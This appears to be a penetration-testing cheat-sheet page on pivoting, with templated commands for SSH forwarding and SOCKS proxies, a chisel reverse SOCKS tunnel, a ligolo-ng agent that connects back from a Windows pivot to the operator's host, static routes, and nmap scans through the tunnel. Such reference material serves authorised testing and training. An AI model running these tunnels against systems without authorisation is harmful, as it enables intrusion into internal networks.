---
title: Tunnelling
order: 1
tags: [pivot, tunnel, ssh, socks, chisel]
---

## Port forwarding

RHOST is the SSH pivot. RPORT is a service on that pivot's loopback and becomes the local forwarded port. SSH uses its default transport port.

```bash
ssh -N -L 127.0.0.1:{{RPORT}}:127.0.0.1:{{RPORT}} '{{USER}}@{{RHOST}}'
```

Connect the local client to 127.0.0.1:RPORT. Requires SSH access and permitted forwarding. [OpenSSH manual](https://man.openbsd.org/ssh).

## SOCKS proxies

RHOST is the SSH pivot; port 1080 becomes the operator's SOCKS listener.

```bash
ssh -N -D 127.0.0.1:1080 '{{USER}}@{{RHOST}}'
```

Configure a SOCKS-aware client to use it. Connections originate from the pivot. [OpenSSH manual](https://man.openbsd.org/ssh).

## Chisel reverse SOCKS

Use dedicated tunnel USER/PASS. Port 9000 is the chisel control port; the SOCKS listener uses operator-side port 1080.

```bash
# Operator machine
chisel server --port 9000 --reverse --auth '{{USER}}:{{PASS}}'
```

```bash
# Pivot machine
chisel client --auth '{{USER}}:{{PASS}}' '{{LHOST}}:9000' R:socks
```

The reverse SOCKS endpoint exits through the pivot. TODO: verify the actual server fingerprint before adding client fingerprint pinning. [Chisel help](https://github.com/jpillora/chisel).

## Tunnel troubleshooting

For this check, port 1080 is the local SOCKS port, not the chisel control port. RHOST/RPORT identify the internal HTTP service.

```bash
curl --socks5-hostname 127.0.0.1:1080 -m 5 -i 'http://{{RHOST}}:{{RPORT}}/'
```

- [ ] Check the control connection and local listener separately.
- [ ] Verify the pivot can reach the destination and resolve its name.
- [ ] Test the application through the tunnel; a listening socket alone is insufficient.

[curl proxy and timeout options](https://curl.se/docs/manpage.html).

## Static route

When the pivot has a direct interface on the internal network and routing through that host is permitted, add a temporary route on Kali. Replace the example subnet and pivot address with evidence from the target.

```bash
sudo ip route add 10.10.139.0/24 via {{RHOST}}
sudo ip route del 10.10.139.0/24 via {{RHOST}}
```

Verify with `ping` and a scanner before assuming every host is reachable. Remove the route when the pivot session ends.

## Ligolo-ng tunnel

Use when whole tools (nmap, WinRM clients) must reach an internal range through one pivot. Get both release binaries on Kali first:

```bash
mkdir -p /home/kali/tools/ligolo-ng /home/kali/tools/binaries
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_v0.9.2_linux_amd64.tar.gz -O /home/kali/tools/ligolo-ng/proxy.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_v0.9.2_windows_amd64.zip -O /home/kali/tools/ligolo-ng/agent.zip
unzip -jo /home/kali/tools/ligolo-ng/agent.zip agent.exe -d /home/kali/tools/binaries
tar xzf /home/kali/tools/ligolo-ng/proxy.tar.gz -C /home/kali/tools/ligolo-ng proxy
```

`proxy` runs on Kali; `agent.exe` goes to the Windows pivot (about 10 MB — verify the size after unpacking). TODO: verify the current release before relying on pinned paths. Transfer the agent with [Evil-WinRM's upload](services/remote-access#winrm-checks-and-shell) or a [Windows download](shells/file-transfers#downloading-on-windows).

Start the proxy as root on Kali and keep it running; it listens on 11601/tcp by default:

```bash
sudo /home/kali/tools/ligolo-ng/proxy -selfcert
```

From a session on the pivot, connect the agent back to Kali's reachable address:

```powershell
.\agent.exe -connect {{LHOST}}:11601 -ignore-cert
```

In the proxy prompt, pick the connected agent and start the tunnel interface:

```
session
start
ifconfig
```

`session` lists connected agents; select the pivot's. `start` brings the `ligolo` TUN interface up on Kali. `ifconfig` shows the pivot's own interfaces — use it to pick the internal subnet for the route.

In a second Kali terminal, route the internal range through the interface and verify:

```bash
sudo ip route add 10.10.139.0/24 dev ligolo
ping 10.10.139.141
sudo nmap -sn 10.10.139.0/24
```

Replace the example range with the pivot's internal subnet. Traffic now routes natively through the tunnel — no proxychains wrapper. Teardown is `sudo ip route del 10.10.139.0/24 dev ligolo` and `stop` in the proxy. [Ligolo-ng](https://github.com/nicocha30/ligolo-ng).

## Scan through a tunnel

With a routed interface (Ligolo), aim scanners directly at the internal range:

```bash
sudo nmap -sS -p- -Pn -n 10.10.139.142 -oA ms02-tcp
```

With a SOCKS proxy instead, wrap the tool and force full connect scans; ping and SYN scans do not traverse SOCKS:

```bash
proxychains nmap -sT -Pn -p 445,5985 {{RHOST}}
```

Confirm reachability per host before interpreting a scan as complete. [Nmap scan techniques](https://nmap.org/book/man-port-scanning-techniques.html), [proxychains](https://github.com/haad/proxychains).
